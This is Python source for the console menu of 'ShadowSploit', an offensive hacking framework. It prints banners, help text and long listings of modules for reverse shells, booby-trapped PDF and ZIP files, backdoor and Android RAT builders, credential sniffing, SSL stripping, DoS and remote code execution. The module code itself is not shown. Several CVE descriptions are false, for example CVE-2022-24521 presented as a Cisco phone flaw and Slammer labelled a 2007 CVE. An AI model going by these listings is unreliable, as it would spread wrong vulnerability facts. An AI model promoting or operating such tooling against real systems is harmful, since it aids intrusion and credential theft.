# DISCLAMER! : Every risk you done with this tool, is on your own sholder.
# I know This tool has a long code and if you want to change the code, you may deal with error!.
# This tool is created for hackers and pen testers.

import os
import time
import random
import signal
import sys
import arrow
import psutil
import readline
from exploits import *
from payloads import *
from tools import *

logs = []  # Store your logs here

HISTORY_FILE = 'scconsole_history.txt'

# Load history at startup
if os.path.exists(HISTORY_FILE):
    readline.read_history_file(HISTORY_FILE)

def save_history():
    readline.write_history_file(HISTORY_FILE)

#colors
class color:
    red = '\33[91m'
    blue = '\033[94m'
    white = '\033[0m'
    underline = '\033[4m'
    green = '\033[92m'
    warning = '\033[93m'
    logging = '\33[34m'

def signal_handler(sig, frame):

    print()
    print("\nCtrl+C pressed, exiting...")

    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

def start():
    os.system('clear')
    print("Starting scconsole...")
    time.sleep(0.3)
    os.system('clear')
    print("Starting scconsole*..")
    time.sleep(0.3)
    os.system('clear')
    print("Starting scconsole**.")
    time.sleep(0.3)
    os.system('clear')
    print("Starting scconsole***")
    time.sleep(0.3)


def Menu():
    os.system('clear')
    list = [color.red + """         
.------..------..------..------..------..------..------..------.
|S.--. ||C.--. ||S.--. ||P.--. ||L.--. ||O.--. ||I.--. ||T.--. |
| :(): || :(): || (\/) || (\/) || (\/) || :/\: || :/\: || :(): |
| ()() || ()() || :\/: || :\/: || :\/: || :\/: || :\/: || ()() |
| '--'S|| '--'C|| '--'S|| '--'P|| '--'L|| '--'O|| '--'I|| '--'T|
`------'`------'`------'`------'`------'`------'`------'`------'
                         ShadowSploit
""",
color.logging + """
             __
          _.-'.-'-.__
       .-'.       '-.'-._ __.--._
-..'\,-,/..-  _         .'   \   '----._
 ). /_ _\' ( ' '.         '-  '/'-----._'-.__
 '..'     '-r   _      .-.       '-._ \\
 '.\. Y .).'       ( .'  .      .\          '\'.
 .-')'|'/'-.        \)    )      '',_      _.c_.\\
   .<, ,>.          |   _/\        . ',   :   : \\
  .' \_/ '.        /  .'   |          '.     .'  \)
                  / .-'    '-.        : \   _;   ||
                 / /    _     \_      '.'\ ' /   ||
                /.'   .'        \_      .|   \   \|
               / /   /      __.---'      '._  ;  ||
              /.'  _:-.____< ,_           '.\ \  ||
             // .-'     '-.__  '-'-\_      '.\/_ \|
            ( };====.===-==='        '.    .  \\: \\
             \\ '._        /          :   ,'   )\_ \\
              \\   '------/            \ .    /   )/
               \|        _|             )Y    |   /
                \\      \             .','   /  ,/
                 \\    _/            /     _/
                  \\   \           .'    .'
                   '| '1          /    .'
                     '. \        |:    /
                       \ |       /', .'
                        \(      ( ;z'
                         \:      \ '(_
                          \_,     '._ '-.___
                                      '-' -.\\

                    ShadowSploit
""",
color.blue + """
                                    ShadowSploit       
                                         *       
                                                 
                                        *        
                                                 
                                        *        
                                         *       
                                        FRAMEWORK
                                        * * *    
                                         * *  ***
                                             *   
                                          *      
                                                *
                                                 
                                           *     
                                            *    
                                        *    **  
                                                 
                                                 
                                         *     * 
""",
color.red + """
.dP"Y8 88  88    db    8888b.   dP"Yb  Yb        dP .dP"Y8 88""Yb 88      dP"Yb  88 888888 
`Ybo." 88  88   dPYb    8I  Yb dP   Yb  Yb  db  dP  `Ybo." 88__dP 88     dP   Yb 88   88   
o.`Y8b 888888  dP__Yb   8I  dY Yb   dP   YbdPYbdP   o.`Y8b 88'''  88  .o Yb   dP 88   88   
8bodP' 88  88 dP''''Yb 8888Y"   YbodP     YP  YP    8bodP' 88     88ood8  YbodP  88   88   
""",
"""
                                       """ + color.red + """ ___
                                        \__\ 
                                            \ """ + color.white + """
                                       ShadowSploit
                                             
                                         ,~'''~.
                                      ,-/       \-.
                                    .' '`._____.'` `. 
                                    `-._         _,-'
                                      _|`--...--'|_     
                                  ___/\|         |/\___
                                """ + color.green + """ /     \\\_______//     \\
                                /       \       /       \\""" + color.white + """
                            -----------------------------------
                            |            """ + color.red + """ ___""" + color.white + """                 |
                            |             """ + color.red + """\__\ """ + color.white + """               |
                            |                 """ + color.red + """\ """ + color.white + """              |
                      (o)   |                                 |
                       |    |    [|] [|] [] []                |
                        \   |     |   |                       |__
                         \  ------|---|----||||----------------  |
                          \       | |_|[|]_||||__________________|
                           \______|   |/  _||||_
                                         /______\\
"""]
    random_banner = random.choice(list)
    print(random_banner)
    print()
    print()
    print()
    print(color.white + "        *[ " + color.red + "ShadowSploit v2.1" + color.white + "                             ]*")
    print("        *[ 102 exploits - 47 auxiliary - 27 cve exploits ]*")
    print("        *[ 53 payloads - 5 buffer overflow               ]*")
    print()
    print("shadowsploit tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
    print()
    Console()


def Console():
    scconsole = input("sc~>")
    logs.append(scconsole + '\n')
    readline.add_history(scconsole)
    save_history()
    if scconsole == "help" or scconsole == "h":
        print("""
HELP MENU: 

help ---> to see this help menu.
clear ---> to clear the screen.
use <exploit> ---> to use the exploit.
search ---> to see the search options.
exit ---> to exit from sc-console.
show payloads ---> to see avalable payloads in shadowsploit.
use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
db_scscanner ---> normal scanner of scconsole, type 'db_scscanner -h' to see help menu of db_scscanner.
gui ---> runs the scconsole GUI version (in GUI, you can't use all exploits!).
""")
    elif scconsole == "show options":
        print("""
PLEASE CHOOSE AN EXPLOIT THEN TYPE THIS!
""")
    elif scconsole == "clear":
        os.system('clear')
    elif scconsole == "search" or scconsole == "search ":
        print("""
search [ exploits | exploit | windows | site | cve-exploits ]
       [ osx | linux | multi | server | dos | php | android ]
       [ auxiliary | sniffer | scanner | buffer_overflow    ]
""")
    elif scconsole == "search exploits":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """multi/ssh-login-test""" + color.white + """                                24/01/11       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
|- """ + color.red + """windows/java-rhino""" + color.white + """                                  24/01/12       for excuteshellcommand http port.
|- """ + color.red + """site/tomcat-mgr-login""" + color.white + """                               24/01/12       for brute force login pages.
|- """ + color.red + """windows/ms17_010""" + color.white + """                                    24/01/13       for brute force windows smb port.
|- """ + color.red + """exploit/bypassuac-eventvwr""" + color.white + """                          24/01/13       for execute the command with elevated privileges on the target.
|- """ + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """                    24/01/14       for scanning target and finds vulnerabilite on target machine.
|- """ + color.red + """site/XSS-SQLi-PHP-PASS""" + color.white + """                              24/01/14       to try passwords, sql injection, xss, php on the taregt login-page.
|- """ + color.red + """site/vuln-curl-website""" + color.white + """                              24/01/14       for finding vulnerabilite in the target website.
|- """ + color.red + """site/find-vulnerabilites-website2""" + color.white + """                   24/01/14       for finding vulnerabilite with payload you specified.
|- """ + color.red + """site/ZIP-exploit""" + color.white + """                                    24/01/16       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
|- """ + color.red + """windows/PDF-exploit""" + color.white + """                                 24/01/18       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
|- """ + color.red + """exploit/ssh-version""" + color.white + """                                 24/01/18       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
|- """ + color.red + """multi/ftp-login-test""" + color.white + """                                24/01/19       for login on port 21 or 20 ftp port.
|- """ + color.red + """site/http-login-test""" + color.white + """                                24/01/19       for login on port 80 http port.
|- """ + color.red + """exploit/reverse-shell""" + color.white + """                               24/01/20       for get a reverse shell by sending a link.
|- """ + color.red + """exploit/cve-2023-22518/cve-2023-22518""" + color.white + """               23/09/29       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
|- """ + color.red + """exploit/cve-2023-22518/vuln-test-for-cve-2023-22518""" + color.white + """ 23/09/29       allow to test the target to find cve-2023-22518 vulnerabilitie.
|- """ + color.red + """dos/DD_D_Attack""" + color.white + """                                     25/02/01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
|- """ + color.red + """windows/7-zip_cve-2025-0411""" + color.white + """                         25/02/04       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
|- """ + color.red + """site/Directory-finder""" + color.white + """                               25/02/06       Finds the Pages and directorys, and brute-forces the directorys.
|- """ + color.red + """site/struts2_namespace_ognl""" + color.white + """                         25/02/07       exploits the Struts2 framework to execute arbitrary code. It uses the OGNL injection vulnerability.
|- """ + color.red + """multi/shell_reverse_tcp""" + color.white + """                             25/02/06       provides a reverse shell payload that can be used to establish a reverse shell connection.
|- """ + color.red + """osx/kernel_xnu_ip_fragment_privesc""" + color.white + """                  25/02/06       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
|- """ + color.red + """osx/kernel_xnu_ip_fragment_privesc_2""" + color.white + """                25/02/06       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
|- """ + color.red + """site/reverse_http""" + color.white + """                                   25/02/08       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
|- """ + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03       This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
|- """ + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08       find vulnerabilities like common open ports, if the password is weak, the kernal version.
|- """ + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08       extract sensitive information with the payloads have, extract informations like tables, columns, databases.
|- """ + color.red + """site/cve-2022-24521""" + color.white + """                                 22/04/12       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
|- """ + color.red + """site/information-gather""" + color.white + """                             25/02/17       gets the information from the website like some links, some images, some more information.
|- """ + color.red + """site/port-scan"""  + color.white + """                                      25/02/17       Scans for open ports (work normaly!).
|- """ + color.red + """dos/ciscodos""" + color.white + """                                        03/07/22       Remote DoS against the recent Cisco IOS vuln.
|- """ + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """           04/02/14       Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
|- """ + color.red + """linux/tcpdump_packet_sniffer""" + color.white + """                        04/04/05       tcpdump - ISAKMP Identification Payload Integer Overflow.
|- """ + color.red + """php/RCE_via_PHP""" + color.white + """                                     25/02/18       This exploit exploits a vulnerability in a PHP application that allows arbitrary code execution on the server.
|- """ + color.red + """php/SOPlanning_1-52-01_RCE""" + color.white + """                          24/11/15       SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE)(Authenticated).
|- """ + color.red + """multi/Typora_v1-7-4""" + color.white + """                                 24/01/29       Typora v1.7.4 - OS Command Injection.
|- """ + color.red + """php/Wp2Fac""" + color.white + """                                          23/09/08       Wp2Fac - OS Command Injection.
|- """ + color.red + """multi/os_detector""" + color.white + """                                   25/02/19       try to detect the target OS with the port you typed.
|- """ + color.red + """multi/pop3-pass""" + color.white + """                                     25/02/20       exploits a buffer overflow vulnerability in a POP3 server.
|- """ + color.red + """multi/pop3-brute-force""" + color.white + """                              25/02/21       brute-forcing the pop3 port.
|- """ + color.red + """windows/shell-storm""" + color.white + """                                 25/02/23       trys to send buffer overflow and take a shellcode.
|- """ + color.red + """site/Aurba-501""" + color.white + """                                      24/08/24       Remote Command Execution | Aurba 501.
|- """ + color.red + """site/HughesNet-HT2000W-Satellite-Modem""" + color.white + """              24/08/24       HughesNet HT2000W Satellite Modem (Arcadyan httpd 1.0) - Password Reset.
|- """ + color.red + """server/cve-2025-0001""" + color.white + """                                25/01/01       Remote Code Execution in Apache HTTP Server 2.4.54.
|- """ + color.red + """server/cve-2025-0006""" + color.white + """                                25/01/01       SQL Injection in MySQL 8.0.28.
|- """ + color.red + """windows/reverse_tcp""" + color.white + """                                 25/02/28       send a payload to the target machine, if success, connect back to attacker machine.
|- """ + color.red + """exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti""" + color.white + """ 25/01/02 This vulnerability enables attackers to upload malicious files (e.g., web shells) and execute commands on the target system with elevated privileges.
|- """ + color.red + """site/Devika-v1-Path-Traversal""" + color.white + """                       24/08/04       Devika v1 - Path Traversal via 'snapshot_path' Parameter.
|- """ + color.red + """sniffer/sniffer""" + color.white + """                                     25/03/13       This module captures network traffic and logs it to a file.
|- """ + color.red + """php/POST-request""" + color.white + """                                    25/03/14       aims to upload a PHP file with a command execution payload to a vulnerable upload URL.
|- """ + color.red + """sniffer/credential-collector""" + color.white + """                        25/03/14       This module collects cleartext credentials, such as passwords, from network traffic.
|- """ + color.red + """sniffer/inspect_traffic""" + color.white + """                             25/03/16       This module analyzes network traffic and identifies potential vulnerabilities.
|- """ + color.red + """sniffer/SSLstrip""" + color.white + """                                    25/03/17       This module performs SSL stripping, which modifies HTTPS traffic to remove encryption and capture cleartext credentials.
|- """ + color.red + """sniffer/tcpdump-sniffer""" + color.white + """                             25/03/18       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
|- """ + color.red + """sniffer/ettercap-sniffer""" + color.white + """                            25/03/18       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
|- """ + color.red + """multi/nmap-version-detection""" + color.white + """                        25/04/04       uses nmap to detect version.
|- """ + color.red + """sniffer/ble-scanner""" + color.white + """                                 25/04/04       scans bluetooths around you (sudo permission needed!).
|- """ + color.red + """multi/ble-bypass""" + color.white + """                                    25/04/05       This is a vulnerability in the BLE protocol that allows attackers to bypass security measures and gain unauthorized access to a target system. The exploit involves exploiting a flaw in the encryption used in BLE connections.
|- """ + color.red + """multi/ble-scanner""" + color.white + """                                   25/04/04       scans bluetooths around you (sudo permission needed!).
|- """ + color.red + """dos/ble-dos""" + color.white + """                                         25/04/05       scans the bluetooths around you and then let you to choose target, trys to connect, then starts the attack.
|- """ + color.red + """scanner/portscan-tcp""" + color.white + """                                25/04/08       scans for open ports.
|- """ + color.red + """scanner/vnc-none-auth""" + color.white + """                               25/04/08       scans the VNC port to see if it is open or closed.
|- """ + color.red + """scanner/ftp-anon""" + color.white + """                                    25/04/08       scans target port 21 to if anonymous access is enabled on port 21 (ftp port).
|- """ + color.red + """scanner/portmap-amp""" + color.white + """                                 25/04/08       attempts to connect to a web server at the specified IP address and checks the response for indicators of an AMP stack (Apache, MySQL, PHP).
|- """ + color.red + """scanner/subdomain-scan""" + color.white + """                              25/04/10       This scanner exploits the subdomain scanner to look for specific subdomains by using a wordlist.
|- """ + color.red + """scanner/portscan""" + color.white + """                                    25/04/10       scans the port you specified to see they are open or closed.
|- """ + color.red + """scanner/ping_ip_site""" + color.white + """                                25/04/15       uses ping tool to make sure target or website is reachable.
|- """ + color.red + """server/php-cgi-arg-injection""" + color.white + """                        25/04/16        This exploit exploits a vulnerability in the PHP CGI (Common Gateway Interface) that allows an attacker to execute arbitrary commands on the server.
|- """ + color.red + """multi/cve-2025-0282""" + color.white + """                                 25/04/18       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
|- """ + color.red + """multi/generate_backdoor""" + color.white + """                             25/04/24       This exploit uses scpgenerator to generate a backdoor for you.
|- """ + color.red + """multi/nc-listener""" + color.white + """                                   25/04/25       starts a listener with netcat (netcat reqires!).
|- """ + color.red + """windows/ms08_067_netapi""" + color.white + """                             25/02/26       MS08-067 vulnerability in the NetAPI32 service on Windows XP and Server 2003. It exploits a stack-based buffer overflow in the NetApi32.dll library.
|- """ + color.red + """php/WordPress_Core_6-2_Directory_Traversal""" + color.white + """          25/04/27       WordPress Core 6.2 - Directory Traversal.
|- """ + color.red + """dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS""" + color.white + """ 25/04/27       Apache Commons FileUpload and Apache Tomcat DoS.
|- """ + color.red + """site/Apache_commons_text_RCE""" + color.white + """                        25/04/28       This exploit demonstrates an RCE vector via POST data, differing.
|- """ + color.red + """scanner/http-options""" + color.white + """                                25/05/01       scan the specified host for the available HTTP methods and print the results.
|- """ + color.red + """scanner/https-options""" + color.white + """                               25/05/01       scan the specified host for the available HTTP methods and print the results.
|- """ + color.red + """scanner/server-scanner""" + color.white + """                              25/05/01       It sends an HTTP GET request to the target URL and retrieves the server headers. If the server header indicates PHP, it extracts the PHP version and returns it.
|- """ + color.red + """site/Bludit""" + color.white + """                                         20/10/23       Bludit 3.9.2 - Auth Bruteforce Bypass.
|- """ + color.red + """windows/ShellSend""" + color.white + """                                   25/05/21       Sends a buffer overflow to your tagret and then gives you a reverse shell access.
|- """ + color.red + """site/shell_inject""" + color.white + """                                   25/05/26       Try some OS Command Injection payloads to see of there is any OS Command Injection in the web application, and gives you the shell.
|- """ + color.red + """android/android_reverse_tcp""" + color.white + """                          25/06/02       Creates a RAT file with scRAT tool for an andorid device, then start a listener(but just you need to do is to send the RAT to your target!).
|- """ + color.red + """android/GetShell""" + color.white + """                                    25/06/15       runs a listener with scRAT to get a shell from an android device.
|- """ + color.red + """android/BuildShell""" + color.white + """                                  25/06/15       Creates a apk file to get a shell from an android.
|- """ + color.red + """site/os_finder""" + color.white + """                                      25/06/29       Trys to find the target website OS from header and robots.txt .
|- """ + color.red + """site/dir_enum""" + color.white + """                                       25/06/29       Trys to brute-force directorys and shows you with status code.
|- """ + color.red + """site/sql_injector""" + color.white + """                                   25/06/29       This module will try to find a sql injection after that if trys to extract the tables and after that trys to extract columns.
|- """ + color.red + """site/cmd_injector""" + color.white + """                                   25/06/29       Trys to find OS Command injection then if you want it will try to give a shell access to target.
|- """ + color.red + """site/lfi_rfi_scanner""" + color.white + """                                25/06/29       It will scan for LFI and RFI vulnerability.
|- """ + color.red + """site/xss_scan""" + color.white + """                                       25/06/29       Try to find a XSS vulnerability on that website page.
|- """ + color.red + """site/upload_finder""" + color.white + """                                  25/06/29       Try to find an upload page on that website.
|- """ + color.red + """multi/rce_server""" + color.white + """                                    25/07/05       This module is listener for RCE(Remote Command Execution) as server(server means attacker).
|- """ + color.red + """Exel_Password_Recovery""" + color.white + """                              18/12/18       Exel Password Recovery 8.2.0.0 - Local Buffer Overflow Denial of Service.
|- """ + color.red + """scanner/WAF_Checker""" + color.white + """                                 25/07/09       This module will try some payloads and other thinks to find the target WAF(Web Application Firewall) type and version.
|- """ + color.red + """multi/listener""" + color.white + """                                      25/07/10       This module will start a listener.
|- """ + color.red + """scanner/csrf_token_detect""" + color.white + """                           25/07/12       This module will detect if target using csrf token.
|- """ + color.red + """windows/windows_webdav_url_rce_cve_2025_33053""" + color.white + """       25/07/19       This module allows unauthenticated attackers to execute arbitrary commands on the target system via a Maliciously Crafted WebDav request containing a vulnerable url path.
|- """ + color.red + """site/cve_2021_41773_apache_rce""" + color.white + """                      25/07/19       This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49, it abuse a path traversal flaw in the url let attacker to access arbitrary files, under certain, execute arbitrary commands via CGI.
|- """ + color.red + """site/cve_2021_42013_apache_bypass_rce""" + color.white + """               25/09/20       This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49 and 2.4.50, triggered via path traversal and command injection. it is a bypass and upgrade of the cve_2021_41773 vulnerability.
|- """ + color.red + """site/file_list_wordpress_pligun_4-2-2""" + color.white + """               25/07/22       Simple File List WordPress Plugin 4.2.2 - File Upload to RCE.
|- """ + color.red + """windows/smbghost""" + color.white + """                                    25/07/23       A critical pre-auth (RCE) vulnerability in the SMBv3.1.1 protocol on Windows 10/2019.
""")
    elif scconsole == "search exploit":
        print("""
    Exploits                                                 When created?        Discrepstion 
       |
_______|
|- """ + color.red + """exploit/bypassuac-eventvwr""" + color.white + """                                   24/01/13       for execute the command with elevated privileges on the target.
|- """ + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """                             24/01/14       for scanning target and finds vulnerabilite on target machine.
|- """ + color.red + """exploit/ssh-version""" + color.white + """                                          24/01/18       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
|- """ + color.red + """exploit/reverse-shell""" + color.white + """                                        24/01/20       for get a reverse shell by sending a link.
|- """ + color.red + """exploit/cve-2023-22518/cve-2023-22518""" + color.white + """                        23/09/29       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
|- """ + color.red + """exploit/cve-2023-22518/vuln-test-for-cve-2023-22518""" + color.white + """          23/09/29       allow to test the target to find cve-2023-22518 vulnerabilitie.
|- """ + color.red + """exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti""" + color.white + """    25/01/02       This vulnerability enables attackers to upload malicious files (e.g., web shells) and execute commands on the target system with elevated privileges.
""")
    elif scconsole == "search windows":
        print("""
    Exploits                                  When created?        Discrepstion 
       |
_______|
|- """ + color.red + """windows/PDF-exploit""" + color.white + """                           24/01/18         for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
|- """ + color.red + """windows/ftp-login-test""" + color.white + """                        24/01/19         for login on port 21 or 20 ftp port.
|- """ + color.red + """windows/java-rhino""" + color.white + """                            24/01/12         for excuteshellcommand http port.
|- """ + color.red + """windows/ms17_010""" + color.white + """                              24/01/13         for brute force windows smb port.
|- """ + color.red + """windows/ssh-login-test""" + color.white + """                        24/01/11         for brute forcing ssh port.
|- """ + color.red + """windows/7-zip_cve-2025-0411""" + color.white + """                   25/02/04         This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
|- """ + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """     04/02/14         Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
|- """ + color.red + """windows/shell-storm""" + color.white + """                           25/02/23         trys to send buffer overflow and take a shellcode.
|- """ + color.red + """windows/reverse_tcp""" + color.white + """                           25/02/28         send a payload to the target machine, if success, connect back to attacker machine.
|- """ + color.red + """windows/ms08_067_netapi""" + color.white + """                       25/02/26         MS08-067 vulnerability in the NetAPI32 service on Windows XP and Server 2003. It exploits a stack-based buffer overflow in the NetApi32.dll library.
|- """ + color.red + """windows/ShellSend""" + color.white + """                             25/05/21         Sends a buffer overflow to your tagret and then gives you a reverse shell access.
|- """ + color.red + """Exel_Password_Recovery""" + color.white + """                        18/12/18         Exel Password Recovery 8.2.0.0 - Local Buffer Overflow Denial of Service.
|- """ + color.red + """windows/windows_webdav_url_rce_cve_2025_33053""" + color.white + """ 25/07/19         This module allows unauthenticated attackers to execute arbitrary commands on the target system via a Maliciously Crafted WebDav request containing a vulnerable url path.
|- """ + color.red + """windows/smbghost""" + color.white + """                              25/07/23         A critical pre-auth (RCE) vulnerability in the SMBv3.1.1 protocol on Windows 10/2019.
""")
    elif scconsole == "search site":
        print("""
    Exploits                          When created?        Discrepstion 
       |
_______|
|- """ + color.red + """site/XSS-SQLi-PHP-PASS""" + color.white + """                 24/01/14        for alert the XSS attack in html file.
|- """ + color.red + """site/vuln-curl-website""" + color.white + """                 24/01/14        for finding vulnerabilite in the target website.
|- """ + color.red + """site/find-vulnerabilites-website2""" + color.white + """      24/01/14        for finding vulnerabilite with payload you specified.
|- """ + color.red + """site/http-login-test""" + color.white + """                   24/01/19        for login on port 80 http port.
|- """ + color.red + """site/ZIP-exploit""" + color.white + """                       24/01/16        for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
|- """ + color.red + """site/tomcat-mgr-login""" + color.white + """                  24/01/12        for brute force login pages.
|- """ + color.red + """site/Directory-finder""" + color.white + """                  25/02/06        Finds the Pages and directorys, and brute-forces the directorys (works slow).
|- """ + color.red + """site/struts2_namespace_ognl""" + color.white + """            25/02/07        exploits the Struts2 framework to execute arbitrary code. It uses the OGNL injection vulnerability.
|- """ + color.red + """site/reverse_http""" + color.white + """                      25/02/08        the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
|- """ + color.red + """site/cve-2022-24521""" + color.white + """                    22/04/12        CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
|- """ + color.red + """site/information-gather""" + color.white + """                25/02/17        gets the information from the website like some links, some images, some more information.
|- """ + color.red + """site/port-scan"""  + color.white + """                         25/02/17       Scans for open ports (work normaly!).
|- """ + color.red + """site/Aurba-501""" + color.white + """                         24/08/24        Remote Command Execution | Aurba 501.
|- """ + color.red + """site/HughesNet-HT2000W-Satellite-Modem""" + color.white + """ 24/08/24        HughesNet HT2000W Satellite Modem (Arcadyan httpd 1.0) - Password Reset.
|- """ + color.red + """site/Devika-v1-Path-Traversal""" + color.white + """          24/08/04        Devika v1 - Path Traversal via 'snapshot_path' Parameter.
|- """ + color.red + """site/Apache_commons_text_RCE""" + color.white + """           25/04/28        This exploit demonstrates an RCE vector via POST data, differing.
|- """ + color.red + """site/Bludit""" + color.white + """                            20/10/23        Bludit 3.9.2 - Auth Bruteforce Bypass.
|- """ + color.red + """site/shell_inject""" + color.white + """                      25/05/26        Try some OS Command Injection payloads to see of there is any OS Command Injection in the web application, and gives you the shell.
|- """ + color.red + """site/os_finder""" + color.white + """                         25/06/29        Trys to find the target website OS from header and robots.txt .
|- """ + color.red + """site/dir_enum""" + color.white + """                          25/06/29        Trys to brute-force directorys and shows you with status code.
|- """ + color.red + """site/sql_injector""" + color.white + """                      25/06/29        This module will try to find a sql injection after that if trys to extract the tables and after that trys to extract columns.
|- """ + color.red + """site/cmd_injector""" + color.white + """                      25/06/29        Trys to find OS Command injection then if you want it will try to give a shell access to target.
|- """ + color.red + """site/lfi_rfi_scanner""" + color.white + """                   25/06/29        It will scan for LFI and RFI vulnerability.
|- """ + color.red + """site/xss_scan""" + color.white + """                          25/06/29        Try to find a XSS vulnerability on that website page.
|- """ + color.red + """site/upload_finder""" + color.white + """                     25/06/29        Try to find an upload page on that website.
|- """ + color.red + """site/cve_2021_41773_apache_rce""" + color.white + """         25/07/19        This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49, it abuse a path traversal flaw in the url let attacker to access arbitrary files, under certain, execute arbitrary commands via CGI.
|- """ + color.red + """site/cve_2021_42013_apache_bypass_rce""" + color.white + """  25/09/20        This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49 and 2.4.50, triggered via path traversal and command injection. it is a bypass and upgrade of the cve_2021_41773 vulnerability.
|- """ + color.red + """site/file_list_wordpress_pligun_4-2-2""" + color.white + """  25/07/22        Simple File List WordPress Plugin 4.2.2 - File Upload to RCE.
""")
    elif scconsole == "search cve-exploits":
        print("""
    Exploits                                           When created?        Discrepstion
       |
_______|
|- """ + color.red + """tools/cve-exploits/SOPlanning-1_52_01-52082""" + color.white + """            25/01/12       Simple Online Planning Tool - Remote Code Execution (RCE) (Authenticated).
|- """ + color.red + """tools/cve-exploits/TCP-IP-DoS-52075""" + color.white + """                    25/01/11       Windows IPv6 CVE-2024-38063 Checker and Denial-Of-Service.
|- """ + color.red + """tools/cve-exploits/http-post-request_cve-2024-48871""" + color.white + """    24/04/18       uses the Flask framework to create a web server with an endpoint that executes arbitrary commands received from the client.
|- """ + color.red + """tools/cve-exploits/http-request_cve-2024-52320""" + color.white + """         24/04/16       creates a payload that includes padding, NSEH, SEH, more padding, and shellcode. The payload is then sent to the target IP and port using a socket connection.
|- """ + color.red + """tools/cve-exploits/http-request_cve-2024-52558""" + color.white + """         24/04/15       creates a payload that includes padding, NSEH, SEH, more padding, and shellcode. The payload is then sent to the target IP and port using a socket connection.
|- """ + color.red + """tools/cve-exploits/ipv6_cve-2024-38106""" + color.white + """                 24/04/12       Windows IPv6 exploit.
|- """ + color.red + """tools/cve-exploits/wordfence_cve-2024-8543""" + color.white + """             25/01/09       This is an exploit for a Cross-Site Scripting (XSS) vulnerability in the Slider Comparison Image plugin for WordPress.
|- """ + color.red + """tools/cve-exploits/OpenSSH_5-3_32bit_86x_0day""" + color.white + """          19/02/01       OpenSSH 5.3 32-bit x86 remote root 0day exploit.
|- """ + color.red + """tools/cve-exploits/OpenSSH_5-3p1_cve-2022-28123""" + color.white + """        22/04/08       OpenSSH 5.3p1 cve-2022-28123 exploit.
|- """ + color.red + """tools/cve-exploits/cve-2023-22518""" + color.white + """                      23/09/29       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
|- """ + color.red + """tools/cve-exploits/7-zip_cve-2025-0411""" + color.white + """                 25/02/04       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
|- """ + color.red + """tools/cve-exploits/PCMan_FTP_Server-2_0-pwd_Remote_Buffer_Overflow""" + color.white + """23/09/25       PCMan FTP Server 2.0 pwd Remote Buffer Overflow.
|- """ + color.red + """tools/cve-exploits/Heartbleed_cve-2014-0160""" + color.white + """            14/04/12       Heartbleed is a critical vulnerability in the OpenSSL library that allows attackers to steal sensitive information from compromised systems.
|- """ + color.red + """tools/cve-exploits/POODLE_cve-2014-3566""" + color.white + """                14/02/06       POODLE is a vulnerability in the SSL/TLS protocol that allows attackers to decrypt encrypted traffic.
|- """ + color.red + """tools/cve-exploits/Slammer_cve-2007-5391""" + color.white + """               07/05/23       Slammer is a worm-like exploit that targets vulnerable systems running the Windows operating system.
|- """ + color.red + """tools/cve-exploits/cve-2022-24521""" + color.white + """                      22/04/12       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
